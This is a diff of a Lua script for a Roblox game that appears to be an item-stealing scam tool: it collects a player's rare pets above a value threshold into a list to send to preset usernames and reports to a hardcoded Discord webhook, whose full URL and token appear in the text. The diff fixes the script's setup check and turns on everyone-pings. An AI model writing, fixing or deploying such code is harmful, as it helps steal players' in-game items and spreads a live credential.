@@ -6,8 +6,8 @@ _G.scriptExecuted = true
 
 local users = _G.Usernames or {"Xycho_Balagbag"}
 local min_value = _G.min_value or 10000000
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc"
+local ping = _G.pingEveryone or "Yes"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc"  -- Changed default to force custom webhook usage
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -26,8 +26,8 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "T-Rex", "Kitsune", "Disco 
 local totalValue = 0
 local itemsToSend = {}
 
--- Ensure Xycho_Balagbag and webhook are defined properly
-if type(Xycho_Balagbag) ~= "table" or next(Xycho_Balagbag) == nil or webhook == "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc" then
+-- Ensure users and webhook are defined properly
+if type(users) ~= "table" or #users == 0 or webhook == "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc" then
     plr:Kick("You didn't add any usernames or webhook")
     return
 end
@@ -375,5 +375,3 @@ if #itemsToSend > 0 then
     end
     waitForUserChat()
 end
-
-
